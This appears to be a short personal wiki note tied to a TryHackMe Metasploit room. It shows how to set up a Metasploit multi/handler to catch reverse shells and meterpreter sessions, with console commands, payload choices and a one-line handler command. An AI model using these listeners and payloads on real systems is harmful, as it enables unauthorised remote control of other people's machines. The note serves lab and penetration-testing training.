# msfhandler

[![metasploitexploitation](../../../../../_badges/thmp/metasploitexploitation.svg)](https://tryhackme.com/room/metasploitexploitation)

<div class="row row-cols-lg-2"><div>

The msfconsole can be used to catch reverse shells. Some reverse shell may be upgradable to a [meterpreter](../index.md#meterpreter), which is the main goal.

* First, load the exploit, and define LHOST/LPORT 

```shell!
$ msfconsole -q
msf6> use multi/handler
msf6> setg LHOST tun0
msf6> setg LPORT 4444
```

* Select the payload that would be appropriate

```shell!
msf6> # warning, payload must match your msfvenom payload
msf6> set PAYLOAD php/meterpreter/reverse_tcp
msf6> grep meterpreter show payloads
msf6> grep reverse_tcp grep Linux show payloads
```
</div><div>

* Run the catcher, and wait for incoming connections.

```shell!
msf6> run         # Wait for clients
meterpreter> help # See what you can do
```

➡️ One line command: `msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost tun0; set lport 4444; exploit"`

➡️ Your shell may not be a meterpreter, so you may try to [upgrade it](../index.md#meterpreter).

📚 Refer to [msfvenom](/cybersecurity/red-team/tools/frameworks/metasploit/msfvenom.md) to generate payloads.
</div></div>